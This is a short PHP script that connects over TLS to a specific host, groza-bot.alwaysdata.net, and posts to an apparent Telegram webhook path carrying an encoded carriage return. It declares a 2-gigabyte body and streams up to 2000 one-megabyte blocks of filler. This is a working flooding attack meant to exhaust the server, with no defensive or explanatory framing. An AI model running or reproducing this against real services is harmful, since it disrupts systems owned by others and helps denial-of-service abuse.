<?php
set_time_limit(120);
$fp = fsockopen("ssl://groza-bot.alwaysdata.net", 443, $errno, $errstr, 30);
if (!$fp) {
    echo "$errstr ($errno)\n";
} else {
    $out = "POST /api/telegram-webhook-8516017309%0D HTTP/1.1\r\n";
    $out .= "Host: groza-bot.alwaysdata.net\r\n";
    $out .= "Content-Type: application/json\r\n";
    $out .= "Content-Length: 2000000000\r\n";
    $out .= "Connection: Close\r\n\r\n";
    fwrite($fp, $out);
    
    $chunk = str_repeat("A", 1024 * 1024); // 1MB chunk
    $sent = 0;
    for ($i = 0; $i < 2000; $i++) {
        $res = fwrite($fp, $chunk);
        if ($res === false) {
            echo "Failed writing at $i MB\n";
            break;
        }
        $sent += $res;
    }
    echo "Done sending $sent bytes.\n";
    while (!feof($fp)) {
        echo fgets($fp, 128);
    }
    fclose($fp);
}
?>
